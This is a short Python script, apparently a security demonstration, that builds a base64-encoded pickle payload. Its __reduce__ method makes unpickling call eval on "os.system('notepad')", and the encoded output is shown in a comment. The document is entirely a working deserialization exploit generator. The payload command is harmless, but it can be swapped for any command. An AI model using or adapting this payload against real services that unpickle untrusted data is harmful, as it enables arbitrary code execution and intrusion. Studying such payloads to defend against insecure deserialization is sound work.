# *_*coding:utf-8 *_*
import pickle,base64,os

class Test(object):
    def __reduce__(self):
        return(eval,("os.system('notepad')",))
ret=pickle.dumps(Test())
ret_base64=base64.b64encode(ret)
print(ret_base64)
# b'gANjYnVpbHRpbnMKZXZhbApxAFgUAAAAb3Muc3lzdGVtKCdub3RlcGFkJylxAYVxAlJxAy4='